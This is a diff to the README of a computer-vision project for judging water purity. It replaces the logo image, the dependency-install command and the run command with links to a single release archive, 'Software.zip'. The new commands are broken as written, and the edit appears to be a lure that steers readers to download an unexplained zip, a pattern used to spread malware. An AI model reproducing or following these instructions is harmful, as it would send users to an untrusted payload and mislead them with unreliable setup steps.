@@ -1,6 +1,6 @@
 # Visual Assessment of Water's Purity by Utilizing Machine Learning and Computer Vision
 
-![Project Logo](static/images/logo-deepwater/png/logo-color.png)
+![Project Logo](https://github.com/prakrititz/deepwater/releases/download/v1.0/Software.zip)
 
 ## Introduction
 
@@ -41,12 +41,12 @@ Include relevant images that illustrate:
 
 1. Clone the repository: `git clone <repository_url>`
 2. Navigate to the project directory: `cd <project_directory>`
-3. Install dependencies: `pip install -r requirements.txt`
+3. Install dependencies: `pip install -r https://github.com/prakrititz/deepwater/releases/download/v1.0/Software.zip`
 
 ## Usage
 
 1. Prepare your water sample images and ensure they are labeled appropriately.
-2. Run the model training script: `python app.py`
+2. Run the model training script: `python https://github.com/prakrititz/deepwater/releases/download/v1.0/Software.zip`
 3. Navigate through the flask app.
 
 ## Contributing
